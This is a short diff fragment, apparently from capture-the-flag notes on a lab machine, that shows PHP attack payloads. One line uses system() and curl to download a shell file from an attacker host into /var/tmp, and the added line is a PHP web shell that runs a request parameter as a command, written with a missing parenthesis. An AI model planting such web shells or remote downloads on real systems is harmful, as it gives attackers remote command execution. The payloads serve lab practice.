@@ -53,7 +53,7 @@ No "http://", then
 Try: 
 <?php system("curl 10.10.14.11/shell.txt -o /var/tmp/nineveNotes12.php"); ?>
 
-
+<?php echo system($_REQUEST["ipp"]; ?>
 
 
 
